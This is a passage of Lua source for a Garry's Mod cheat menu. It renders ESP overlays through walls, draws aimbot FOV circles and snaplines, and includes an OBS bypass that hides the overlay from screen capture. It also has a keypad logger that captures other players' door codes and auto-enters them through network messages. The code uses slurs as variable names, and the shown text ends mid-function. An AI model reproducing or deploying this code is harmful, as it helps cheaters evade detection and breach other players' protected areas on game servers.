hacka.viewangle = Angle(0, 0, 0)
hacka.viewvelocity = Vector(0, 0, 0)
local panickey=true

surface.CreateFont("]]..b.font18 ..[[",{font="Roboto",size=20})
surface.CreateFont("]]..b.font22 ..[[",{font="Roboto",size=26})
surface.CreateFont("]]..b.menufont..[[",{font="Roboto",size=18})
surface.CreateFont("]]..b.font14 ..[[",{font="Roboto",size=14})

local function zapic(func,value)
local ad=_util_JSONToTable(_file_Read("]]..b.maincfg..[[","DATA"))
ad[func]=value
_file_Write("]]..b.maincfg..[[",util.TableToJSON(ad))
end
local function zapiclogs(type, log)
    local da = _util_JSONToTable(_file_Read("]]..b.logs..[[", "DATA"))
    da[type] = {"[" .. os.date("%H:%M:%S") .. "] " .. log .. "HLS" .. da[type][1]}
    _file_Write("]]..b.logs..[[", util.TableToJSON(da))
end
function hacka.onitify(a)
if panickey then return end
if IsValid(hacka.rt)or hacka.rt then hacka.rt:Hide()hacka.rt=nil end
surface.SetFont("]]..b.font22 ..[[")
local b=select(1,surface.GetTextSize(a))+10
hacka.rt=vgui.Create("DPanel")
hacka.rt:SetSize(b,38-6)
hacka.rt:SetPos(-b,10)
hacka.rt.Paint=function(self,c,d)
draw.RoundedBox(0,0,0,c,d,hacka.windowbg)
draw.SimpleText(a,"]]..b.font22 ..[[",5,3,hacka.colortext)
surface.SetDrawColor(hacka.border)
surface.DrawOutlinedRect(0,0,c,d)
end
hacka.rt:MoveTo(10,10,.2,0,-1,function()
timer.Simple(3,function()
hacka.rt:MoveTo(-b,10,.2,0,-1)
end)
end)
end
local function radar(b)
local c = {}
for d, e in ipairs(_player_GetAll()) do 
local f = e:GetPos()
local g = Vector(b[1], b[2], b[3])
local h = Angle(90, 0, 0)
local i = b[4] / 2 + (f.x - g.x) / b[6]
local j = b[5] / 2 + (g.y - f.y) / b[6]
local k = h.y - 90 
k = math.rad(k)
i = i - b[4] / 2 
j = j - b[5] / 2 
local l = i * math.cos(k) - j * math.sin(k)
local m = i * math.sin(k) + j * math.cos(k)
l = l + b[4] / 2 
m = m + b[5] / 2
if e == LocalPlayer() then 
c[e:Name()] = {x = math.Round(l),y = math.Round(m),color = team.GetColor(e:Team()),team = team.GetName(e:Team()),localplayer = "yes",rank = e:GetUserGroup()}
else
c[e:Name()] = {x = math.Round(l),y = math.Round(m),color = team.GetColor(e:Team()),team = team.GetName(e:Team()),rank = e:GetUserGroup()}
end 
end
for ent,shit in next, gay["ENTITYLIST"] do
for k,p in next, ents.FindByClass(ent) do
local f = p:GetPos()
local g = Vector(b[1], b[2], b[3])
local h = Angle(90, 0, 0)
local i = b[4] / 2 + (f.x - g.x) / b[6]
local j = b[5] / 2 + (g.y - f.y) / b[6]
local k = h.y - 90 
k = math.rad(k)
i = i - b[4] / 2 
j = j - b[5] / 2 
local l = i * math.cos(k) - j * math.sin(k)
local m = i * math.sin(k) + j * math.cos(k)
l = l + b[4] / 2 
m = m + b[5] / 2
c[p:GetClass()] = {x = math.Round(l),y = math.Round(m),color = gay["WH_ENTITY_NAME_COLOR"],localplayer = "entity"}
end
end
return c 
end
local maps = {}
maps["rp_bangclaw"] = {2579, -1103, 6618, 834, 1078, 9}
maps["rp_downtown_tits_v1"] = {-163 ,-1239 ,7241, 1280, 720, 15}

if GetConVarNumber("gmod_mcore_test")==0 then
RunConsoleCommand("gmod_mcore_test",1)
end
local texturedCham = CreateMaterial( "textured", "VertexLitGeneric", {
["$basetexture"] = "models/debug/debugwhite",
["$model"] = 1,
["$translucent"] = 1,
["$vertexalpha"] = 1,
["$vertexcolor"] = 1
}) 
local wireframeCham = CreateMaterial( "wireframe", "Wireframe", {
["$basetexture"] = "models/debug/debugwhite",
["$model"]       = 1,
["$translucent"] = 1,
["$alpha"]       = 1,
["$nocull"]      = 1,
})
local function CornerBox(x, y, w, h)
local bWidth = w
local bHeight = h
surface.DrawLine(x, y, x, y + (bHeight / 5))
    surface.DrawLine(x, y, x + (bWidth / 5), y)
surface.DrawLine(x + bWidth, y, x + bWidth - (bWidth / 5), y)
    surface.DrawLine(x + bWidth, y, x + bWidth, y + (bHeight / 5))
surface.DrawLine(x, y + bHeight, x + (bWidth / 5), y + bHeight)
surface.DrawLine(x, y + bHeight, x, y + bHeight - (bHeight / 5))
surface.DrawLine(x + bWidth, y + bHeight, x + bWidth - (bWidth / 5), y + bHeight)
surface.DrawLine(x + bWidth, y + bHeight, x + bWidth, y + bHeight - (bHeight / 5))
end
local function box2d(b)
local c, d = em.OBBMins(b), em.OBBMaxs(b)
local e = {
Vector(c.x, c.y, c.z),
Vector(c.x, c.y, d.z),
Vector(c.x, d.y, c.z),
Vector(c.x, d.y, d.z),
Vector(d.x, c.y, c.z),
Vector(d.x, c.y, d.z),
Vector(d.x, d.y, c.z),
Vector(d.x, d.y, d.z)
}
local f, g, h, i = ScrW() * 2, ScrH() * 2, 0, 0
for j, k in next, e do
local l = b:LocalToWorld(k):ToScreen()
f, g = math.min(f, l.x), math.min(g, l.y)
h, i = math.max(h, l.x), math.max(i, l.y)
end
return f, g, h, i
end
local function checknamesinfuck(p)
local b=""
if p.Getamount then b=b.."("..p:Getamount()..")"end
if p.GetHP then b=b.."("..p:GetHP()..")"end
if p.Getowning_ent then if IsValid(p:Getowning_ent())then b=b.."("..p:Getowning_ent():Name()..")"end end
if p.Getcontents then b=b.."("..p:Getcontents()..")"end
if p.GetMoney then b=b.."($"..p:GetMoney()..")"end
if p.PrintedMoney then b=b.."("..p.PrintedMoney..")"end
return b
end
local function espfov(f)
local g=fa
local h=vm.Angle(_em_GetPos(f)-_em_GetPos(me))
local i=math.abs(math.NormalizeAngle(g.y-h.y))
local j=math.abs(math.NormalizeAngle(g.ply-h.ply))
if i<60 && j<60 or hacka.noclipenebled or hacka.miscthipisidion then
return false 
end
return true 
end
local function playerfilters(v)
if( vm.Distance( em.GetPos(v), em.GetPos(me) ) > gay["WH_DISTANCE"] ) then return false; end
if espfov(v) then return false; end
return true;
end
local function playeresp(v)
local isfriend = gay["FRIENDLIST"][_pm_SteamID(v)]
local pos = _em_GetPos(v);
local pos, pos2 = _vm_ToScreen(pos - Vector(0, 0, 5)), _vm_ToScreen( pos + Vector(0, 0, 70 ) );
local h = pos.y - pos2.y;
local w = h / 2.2;
local up_left_right = pos.y-h
local leftf = pos.x-w*0.5
local esp_up = 7
local esp_down = 7
local esp_right = 0
local esp_left = 0
if gay["WH_CHAMS"]&& !gay["OBSBYPASS"] then
local postiion = gay["WH_CHAMS_TYPE"]
local chamColVis = (gay["WH_CHAMS_TEAMCOLOR"])and _team_GetColor(_pm_Team(v)) or gay["WH_CHAMS_COLOR"]
local colorFix = (1 / 255)
local colorchams,colorchams2,colorchams3 = chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix
cam.Start3D(EyePos(), EyeAngles())
if postiion == "XYZ" then 
cam.IgnoreZ(true)
render.SuppressEngineLighting(true)
_em_DrawModel(v);
cam.IgnoreZ(false)
render.SuppressEngineLighting(false)
elseif postiion == "Textured" then
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
_em_SetRenderMode(v, 1);
_em_DrawModel(v);
elseif postiion == "Flat" then
render.SuppressEngineLighting( true )
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
_em_SetRenderMode(v, 1);
_em_DrawModel(v);
render.SuppressEngineLighting( false )
elseif postiion == "Wireframe" then
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( wireframeCham )
_em_SetRenderMode(v, 1);
_em_DrawModel(v);
end
cam.End3D()
end
if gay["WH_BOX"] then
local boxtype = gay["WH_BOX_TYPETYPE"]
if boxtype == "2d" || boxtype == "2d fat" then
local u = pos.y - pos2.y
local t = u / 2.2
if isfriend then
_surface_SetDrawColor(gay["WH_FRIENDCOLOR"])
elseif aimtarget && aimtarget==v then
_surface_SetDrawColor(gay["WH_AIMTARGET_COLOR"])
elseif !gay["WH_BOX_TEAMCOLOR"] then
surface.SetDrawColor(gay["WH_BOX_COLOR"])
else
_surface_SetDrawColor(_team_GetColor(_pm_Team(v)))
end
if boxtype == "2d fat" then
surface.DrawOutlinedRect(pos.x - t / 2, pos.y - u, t, u,2)
else
surface.DrawOutlinedRect(pos.x - t / 2, pos.y - u, t, u,1)
end
elseif boxtype == "Corner" || boxtype == "Corner fat" then
if isfriend then
_surface_SetDrawColor(gay["WH_FRIENDCOLOR"])
elseif aimtarget && aimtarget==v then
_surface_SetDrawColor(gay["WH_AIMTARGET_COLOR"])
elseif !gay["WH_BOX_TEAMCOLOR"] then
_surface_SetDrawColor(gay["WH_BOX_COLOR"])
else
_surface_SetDrawColor(_team_GetColor(_pm_Team(v)))
end
CornerBox(pos.x - w / 2, pos.y -h, w, h)
if boxtype == "Corner fat"then
CornerBox(pos.x - w / 2 + 1, pos.y - h + 1, w - 2, h - 2);
end
else
cam.Start3D()
if isfriend then
render.DrawWireframeBox(_em_GetPos(v),Angle(0, _em_EyeAngles(v).y, 0),em.OBBMins(v),em.OBBMaxs(v),gay["WH_FRIENDCOLOR"])
elseif aimtarget && aimtarget==v then
render.DrawWireframeBox(_em_GetPos(v),Angle(0, _em_EyeAngles(v).y, 0),em.OBBMins(v),em.OBBMaxs(v),gay["WH_AIMTARGET_COLOR"])
elseif !gay["WH_BOX_TEAMCOLOR"]then
render.DrawWireframeBox(_em_GetPos(v),Angle(0, _em_EyeAngles(v).y, 0),em.OBBMins(v),em.OBBMaxs(v),gay["WH_BOX_COLOR"])
else
render.DrawWireframeBox(_em_GetPos(v),Angle(0, _em_EyeAngles(v).y, 0),em.OBBMins(v),em.OBBMaxs(v),_team_GetColor(_pm_Team(v)))
end
cam.End3D()
end
end
if gay["WH_SKELETON"] then
local origin = em.GetPos(v);
for i = 1, em.GetBoneCount(v) do
local parent = em.GetBoneParent(v, i);
if(!parent) then continue; end
local bonepos, parentpos = em.GetBonePosition(v, i), em.GetBonePosition(v, parent);
if(!bonepos || !parentpos || bonepos == origin) then continue; end
local bs, ps = vm.ToScreen(bonepos), vm.ToScreen(parentpos);
if gay["WH_SKELETON_TEAMCOLOR"] then
_surface_SetDrawColor(_team_GetColor(_pm_Team(v)))
else
_surface_SetDrawColor(gay["WH_SKELETON_COLOR"])
end
surface.DrawLine(bs.x, bs.y, ps.x, ps.y);
end
end
_surface_SetFont(hacka.fontplayersg)
if gay["WH_HEALTH"] then
local healthd = _em_Health(v)
local healthposition = gay["WH_HEALTH_POSITION"]
local healthtype = gay["WH_HEALTH_TYPETYPE"]
local function healthbar()
local hp = healthd * h / 100
if hp > h then
hp = h
end
local diff = h - hp
if healthposition == 1 then
_surface_SetDrawColor(0, 0, 0, 255);
surface.DrawRect(pos.x - w / 2 + 1, pos.y - h - 1, w + 2, 3);
_surface_SetDrawColor( ( 100 - healthd ) * 2.55, healthd * 2.55, 0, 255);
surface.DrawRect(pos.x - w / 2 + 2, pos.y - h , hp/2.2, 1);
elseif healthposition == 2 then
_surface_SetDrawColor(0, 0, 0, 255);
surface.DrawRect(pos.x - w / 2 + 1, pos.y, w + 2, 3);
_surface_SetDrawColor( ( 100 - healthd ) * 2.55, healthd * 2.55, 0, 255);
surface.DrawRect(pos.x - w / 2 + 2, pos.y +1 , hp/2.2, 1);
elseif healthposition == 3 then
_surface_SetDrawColor(0, 0, 0)
            surface.DrawRect(pos.x + w / 2 - 5 + 5, pos.y - h - 1, 3, h + 2)
_surface_SetDrawColor((100 - healthd) * 2.55, healthd * 2.55, 0, 255)
surface.DrawRect(pos.x + w / 2 - 4 + 5, pos.y - h + diff, 1, hp)
elseif healthposition == 4 then
_surface_SetDrawColor(0, 0, 0)
surface.DrawRect(pos.x - w / 2 - 5, pos.y - h - 1, 3, h + 2)
_surface_SetDrawColor((100 - healthd) * 2.55, healthd * 2.55, 0, 255)
surface.DrawRect(pos.x - w / 2 - 4, pos.y - h + diff, 1, hp)
end
end
local function showhealth()
local color=Color((100 - healthd) * 2.55, healthd * 2.55, 0)
local tw, th = _surface_GetTextSize(healthd)
surface.SetTextColor(color);
if healthposition == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif healthposition == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif healthposition == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif healthposition == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(healthd);
        end
if healthtype == "Text + Bar" then
showhealth(v)
healthbar(v)
elseif healthtype == "Text" then
showhealth(v)
elseif healthtype == "Bar" then
healthbar(v)
end
end
if gay["WH_ARMOR"] then
local healthd = pm.Armor(v)
local healthposition = gay["WH_ARMOR_POSITION"]
local tw, th = _surface_GetTextSize(healthd)
surface.SetTextColor(Color(0,0,255));
if healthposition == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif healthposition == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif healthposition == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif healthposition == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(healthd);
end
if gay["WH_JOB"] then
local teamid = _pm_Team(v)
local team = _team_GetName(teamid)
local tw, th = _surface_GetTextSize(team)
surface.SetTextColor(_team_GetColor(teamid))
local jobposition = gay["WH_JOB_POSITION"]
if jobposition == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif jobposition == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif jobposition == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif jobposition == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(team);
end
if gay["WH_MONEY"] && DarkRP then
local text = DarkRP.formatMoney(_pm_getDarkRPVar(v,"money"))
local tw, th = _surface_GetTextSize(text)
surface.SetTextColor(gay["WH_MONEY_COLOR"]);
local moneypostion = gay["WH_MONEY_POSITION"]
if moneypostion == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif moneypostion == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif moneypostion == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif moneypostion == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(text);
end
if gay["WH_WEAPON"] then
local weaponnn = _pm_GetActiveWeapon(v);
local weaponpostion = gay["WH_WEAPON_POSITION"]
if gay["WH_WEAPON_TYPETYPE"] == "All" then
for _, v in next, _pm_GetWeapons(v) do
local weaponame = wm.GetPrintName(v)
local tw, th = _surface_GetTextSize(weaponame)
surface.SetTextColor(gay["WH_WEAPON_COLOR"]);
if weaponpostion == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif weaponpostion == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif weaponpostion == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif weaponpostion == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(weaponame);
end
elseif weaponnn && em.IsValid(weaponnn)then
local weaponame = wm.GetPrintName(weaponnn)   
local tw, th = _surface_GetTextSize(weaponame)
surface.SetTextColor(gay["WH_WEAPON_COLOR"]);
if weaponpostion == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif weaponpostion == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif weaponpostion == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif weaponpostion == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(weaponame);
end
end
if gay["WH_USERGROUP"] then 
local usergroup = _pm_GetUserGroup(v)
local tw, th = _surface_GetTextSize(usergroup)
surface.SetTextColor(gay["WH_USERGROUP_COLOR"]);
local usergroupostion = gay["WH_USERGROUP_POSITION"]
if usergroupostion == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif usergroupostion == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif usergroupostion == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif usergroupostion == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(usergroup);
end
if gay["WH_NAME"] then
local tw, th = _surface_GetTextSize(_pm_Name(v))
surface.SetTextColor((gay["WH_NAME_FRIENDCOLOR"] && isfriend)&& gay["WH_FRIENDCOLOR"] || gay["WH_NAME_COLOR"]);
local nameposition = gay["WH_NAME_POSITION"]
if nameposition == 1 then
_surface_SetTextPos(pos.x-tw*0.5,up_left_right+2-th-esp_up);
esp_up = esp_up  + th
elseif nameposition == 2 then
_surface_SetTextPos(pos.x-tw*0.5,pos.y-th*0.5+5+esp_down);
esp_down = esp_down  + th
elseif nameposition == 3 then
_surface_SetTextPos(pos.x+w*0.5+10,up_left_right+esp_right);
esp_right = esp_right  + th
elseif nameposition == 4 then
_surface_SetTextPos(leftf-tw-10,up_left_right+esp_left);
esp_left = esp_left  + th
end
_surface_DrawText(_pm_Name(v));
end
if gay["WH_CHAMS"]&& gay["OBSBYPASS"] then
cam.Start3D();
em.DrawModel(v);
cam.End3D();
end
end
local function entityfilters(v)
if( vm.Distance( em.GetPos(v), em.GetPos(me) ) > gay["WH_ENTITY_DISTANCE"] ) then return false; end
if espfov(v) then return false; end
return true;
end
local function entityesp(p,nameent)
local pos = _em_GetPos(p);
local pos, pos2 = _vm_ToScreen(pos - Vector(0, 0, 5)), _vm_ToScreen( pos );
if gay["WH_ENTITY_CHAMS"] && !gay["OBSBYPASS"] then
local typechams = gay["WH_ENTITY_CHAMS_TYPE"]
local colorFix = (1 / 255)
local chamColVis = gay["WH_ENTITY_CHAMS_COLOR"]
local colorchams,colorchams2,colorchams3 = chamColVis.r * colorFix, chamColVis.g * colorFix, chamColVis.b * colorFix
cam.Start3D(EyePos(), EyeAngles())
if typechams == "XYZ" then 
            cam.IgnoreZ(true)
            render.SuppressEngineLighting(true)
_em_DrawModel(p);
cam.IgnoreZ(false)
render.SuppressEngineLighting(false)
elseif typechams == "Textured" then
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
_em_SetRenderMode(p, 1);
_em_DrawModel(p);
elseif typechams == "Flat" then
render.SuppressEngineLighting( true )
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( texturedCham )
_em_SetRenderMode(p, 1);
_em_DrawModel(p);
render.SuppressEngineLighting( false )
elseif typechams == "Wireframe" then
render.SetColorModulation( colorchams,colorchams2,colorchams3 )
render.SetBlend( chamColVis.a * colorFix)
render.MaterialOverride( wireframeCham )
_em_SetRenderMode(p, 1);
_em_DrawModel(p);
end
cam.End3D()
end
if gay["WH_ENTITY_NAME"] then
_surface_SetFont(hacka.fontentitysg)
local shitf = nameent.." "..checknamesinfuck(p)
local tw, th = _surface_GetTextSize(shitf)
surface.SetTextColor(gay["ENTITYLISTclr"][nameent.."_Color"] || gay["WH_ENTITY_NAME_COLOR"]);
_surface_SetTextPos(pos2.x-tw*0.5,pos2.y-th*0.5);
_surface_DrawText(shitf);
end
if gay["WH_ENTITY_BOX"] then
if gay["WH_ENTITY_BOX_TYPE"] == "3d" then
local pos = em.GetPos(p);
local ang = em.GetAngles(p);
local min, max = em.GetRotatedAABB(p, em.GetCollisionBounds(p));
cam.Start3D();
render.DrawWireframeBox( pos, Angle(), min, max, gay["WH_ENTITY_BOX_COLOR"], false );
cam.End3D(); 
else
local colorf = gay["ENTITYLISTclr"][nameent.."_Color"]
if gay["WH_ENTITY_BOX_COLORTYPE"]=="Entity"&& colorf then
_surface_SetDrawColor(colorf)
else
_surface_SetDrawColor(gay["WH_ENTITY_BOX_COLOR"])
end
local x1, y1, x2, y2 = box2d(p)
surface.DrawLine(x1, y1, math.min(x1 + 500, x2), y1)
surface.DrawLine(x1, y1, x1, math.min(y1 + 500, y2))
surface.DrawLine(x2, y1, math.max(x2 - 500, x1), y1)
surface.DrawLine(x2, y1, x2, math.min(y1 + 500, y2))
surface.DrawLine(x1, y2, math.min(x1 + 500, x2), y2)
surface.DrawLine(x1, y2, x1, math.max(y2 - 500, y1))
surface.DrawLine(x2, y2, math.max(x2 - 500, x1), y2)
surface.DrawLine(x2, y2, x2, math.max(y2 - 500, y1))
end
end
end
hacka.reloadautoenter={}
local function hudpaint()
if panickey then return end
if panic then return end

if gay["AIM_DRAWFOV"] && gay["AIM_ENABLED"] then
surface.DrawCircle(ScrW() *0.5, ScrH() *0.5, gay["AIM_FOV"] * 4, gay["WH_FOV_COLOR"])
end
if gay["WH_SNAPLINE"] then
if aimtarget && _em_IsValid(aimtarget) then
local pos = _vm_ToScreen(_em_LocalToWorld(aimtarget, em.OBBCenter(aimtarget)))
_surface_SetDrawColor(gay["WH_SNAPLINE_COLOR"])
surface.DrawLine(ScrW() *0.5, ScrH() *0.5, pos.x, pos.y)
end
end

if gay["MISC_KEYPADLOGGER"] then
for b, q in next, ents.FindByClass("Keypad") do
if q:GetStatus() == 1 then
if gay["KEYPADTYPE"] == 1 then
local kl = q:GetText()
if kl=="****" or kl=="***" or kl=="**" or kl=="*" then continue end
hacka.keypadlogger[q] = kl
else
local kl = q:GetDisplayText()
if kl=="****" or kl=="***" or kl=="**" or kl=="*" then continue end
hacka.keypadlogger[q] = kl
end
end
if hacka.keypadlogger[q] then
if q:GetPos():Distance(me:GetPos()) < gay["MISC_KEYPADLOGGER_DISTANCE"] then
surface.SetFont(hacka.fontentitysg)
local tw, th = surface.GetTextSize(hacka.keypadlogger[q])
surface.SetTextColor(gay["MISC_KEYPADLOGGER_COLOR"]);
surface.SetTextPos(q:LocalToWorld(q:OBBCenter()):ToScreen().x-tw/2,q:LocalToWorld(q:OBBCenter()):ToScreen().y-th/2);
surface.DrawText(hacka.keypadlogger[q]);
end
if gay["MISC_KEYPADLOGGER_AUTOENTER"] and q:GetPos():Distance(me:GetPos()) < 120 then
hacka.reloadautoenter[q] = hacka.reloadautoenter[q] or CurTime()
if hacka.reloadautoenter[q] < CurTime() then
local d = 0
for e = 1, string.len(hacka.keypadlogger[q]) do
timer.Simple(d,function()
if gay["KEYPADTYPE"] == 1 then
net.Start("Keypad")
net.WriteEntity(q)
net.WriteUInt(0, 4)
net.WriteUInt(string.sub(hacka.keypadlogger[q], e, e), 8)
net.SendToServer()
                    else
net.Start("keypad_command")
net.WriteEntity(q)
net.WriteUInt(q.Command_Enter, 3)
net.WriteUInt(string.sub(hacka.keypadlogger[q], e, e), 4)
net.SendToServer()
end
end)
d = d + 0.3
end
timer.Simple(d + 1,function()
if gay["KEYPADTYPE"] == 1 then
net.Start("Keypad")
net.WriteEntity(q)
net.WriteUInt(1, 4)
net.SendToServer()
else
net.Start("keypad_command")
net.WriteEntity(q)
net.WriteUInt(q.Command_Accept, 3)
net.SendToServer()
end
end)
hacka.reloadautoenter[q]=CurTime()+5
end
end
        end
    end
end
if gay["CROSSHAIR_ENABLED"]then
local A=ScrH()*0.5
local z=ScrW()*0.5
local Z=gay["CROSSHAIR_SIZE"];
if gay["CROSSHAIR_FOV"]then
if Z>4 then
draw.RoundedBox(99,z-Z*0.5,A-Z*0.5,Z,Z,gay["CROSSHAIR_COLOR"])
end
end
if gay["CROSSHAIR_CROSSHAIR"]then
_surface_SetDrawColor(gay["CROSSHAIR_COLOR"])
surface.DrawLine(z+Z,A,z-Z,A)
surface.DrawLine(z,A+Z,z,A-Z)
end
if gay["CROSSHAIR_BOX"]then
_surface_SetDrawColor(gay["CROSSHAIR_COLOR"])
surface.DrawOutlinedRect(z-Z-2,A-Z-2,(Z+2)*2+1,(Z+2)*2+1)
end
end
for k,v in next, player.GetAll() do
if(!em.IsValid(v) || em.Health(v) < 1 || v == me || em.IsDormant(v) && gay["WH_DORMANT"]) then continue; end
if(!playerfilters(v)) then continue; end
playeresp(v);
end
for ent,shit in next, gay["ENTITYLIST"] do
for k,p in next, _ents_FindByClass(ent) do
if(em.IsDormant(p) && gay["WH_ENTITY_DORMANT"]) then continue; end
if(!entityfilters(p)) then continue; end
entityesp(p,ent);
end
end
end

local delay = 0
local CurTime=CurTime
local a=_GetRenderTarget("1"..os.time(),ScrW(),ScrH())
hook.Add("ShutDown","]]..b.randomforhook..[[",function()
if gay["MISC_SPECTATORLIST"]and IsValid(hacka.specb) then
local pos,otsos=hacka.specb:GetPos()
if IsValid(hacka.specb)then
zapic("MISC_SPECTATORLIST_X",pos)
zapic("MISC_SPECTATORLIST_Y",otsos)
end
end
if gay["WH_RADAR"]and IsValid(hacka.ac) then
local pos,otsos=hacka.ac:GetPos()
zapic("WH_RADAR_X",pos)
zapic("WH_RADAR_Y",otsos)
end
if gay["WH_INFO"]and IsValid(hacka.info) then
local pos,otsos=hacka.info:GetPos()
zapic("WH_INFO_X",pos)
zapic("WH_INFO_Y",otsos)
end
if !gay["OBSBYPASS"]then return end
render.SetRenderTarget()
end)

local function buttoncheckbind(a)
if a==0 then return end
if me and _pm_IsTyping(me) then
return false
end
if _input_IsKeyDown(a or 200) or input.IsMouseDown(a or 200) then
return true
end
return false
end

hook.Add("HUDPaint","]]..b.randomforhook..[[",function()
if gay["OBSBYPASS"] then
for _,v in next, ]]..b.obsbypassrand..[[ or {} do
if IsValid(v) and v:IsVisible()then
if v:IsHovered() or v:IsChildHovered() then
v:PaintManual()
end
end
end
return 
end
hudpaint()
end)

hook.Add("PostDraw2DSkyBox","]]..b.randomforhook..[[",function()
if panickey then return end
if panic then return end
if gay["WH_NOSKY"] then
render.Clear(gay["WH_NOSKY_COLOR"]["r"],gay["WH_NOSKY_COLOR"]["g"],gay["WH_NOSKY_COLOR"]["b"],0,true,true)
end
end)

local e={x=0,y=0,w=ScrW(),h=ScrH(),dopostprocess=true,origin=b,angles=c,fov=d,drawhud=true,drawmonitors=true,drawviewmodel=true}
hook.Add("RenderScene","]]..b.randomforhook..[[",function()
if panickey then return end
if panic then return end
if gay["WH_FULLBRIGHT"] then
render.SetLightingMode(1)
end
if gay["OBSBYPASS"]then
render.RenderView(e)
render.CopyTexture(nil,a)
cam.Start2D()
hook.Run("AltHUDPaint")
cam.End2D()
render.SetRenderTarget(a)
return true 
end
end)

hook.Add("PreDrawEffects","]]..b.randomforhook..[[",function()
if panickey then return end
if panic then return end
if gay["WH_FULLBRIGHT"] then
render.SetLightingMode(0)
end
end)

hook.Add("player_changename","]]..b.randomforhook..[[",function(data)
zapiclogs("namechange",data.oldname.." changed to "..data.newname)
end)
hook.Add("player_connect","]]..b.randomforhook..[[",function(data)
zapiclogs("connect",data.name.." "..data.networkid)
end)
hook.Add("player_disconnect","]]..b.randomforhook..[[",function(data)
zapiclogs("disconnect",data.name.." "..data.networkid..". "..data.reason)
end)
hook.Add("player_say","]]..b.randomforhook..[[",function(player)
xpcall(function()
zapiclogs("chat",Player(player.userid):Nick()..": "..player.text)
end,function()end)
end)
hook.Add("player_hurt","]]..b.randomforhook..[[",function(b)
local ply=LocalPlayer()
local c="unknown"
local cc="unknown"
local d="map"
local e="unknown weapon"
local s=0
for i,j in next, player.GetAll() do  
if j:UserID()==b.userid then 
c=j:Nick()
cc=j:SteamID()
s=j:Health()
end
if j:UserID()==b.attacker then 
d=j:Nick()
if j:GetActiveWeapon()&& j:GetActiveWeapon():IsValid()then 
e=j:GetActiveWeapon():GetPrintName()
end 
end 
end
if gay["HITSOUNDS"]&& d==ply:Nick()then
surface.PlaySound("buttons/bell1.wav")
end
if gay["NOIFICATION_DAMAGEDMEBY"]&& c==ply:Nick()then
hacka.onitify("You damaged by '"..d.."' with "..e)
end
if gay["NOIFICATION_FRIENDDAMAGED"]&& gay["FRIENDLIST"][cc]then
hacka.onitify("Friend '"..c.."' damaged by '"..d.."' with "..e)
end

zapiclogs("damage",d.." damage "..string.Replace(b.health-s,"-","").." hp "..c.." with "..e)
end)
hook.Add("entity_killed","]]..b.randomforhook..[[",function(qwe)
local ply="unknown"
local atk="map"
local wep="unknown weapon"
local retard=Entity(0)
local killah=Entity(0)
local inflictor=ents.GetByIndex(qwe.entindex_inflictor)
for _,p in next, player.GetAll() do  
if p:EntIndex()==qwe.entindex_killed then 
ply=p:Nick()
retard=p 
end
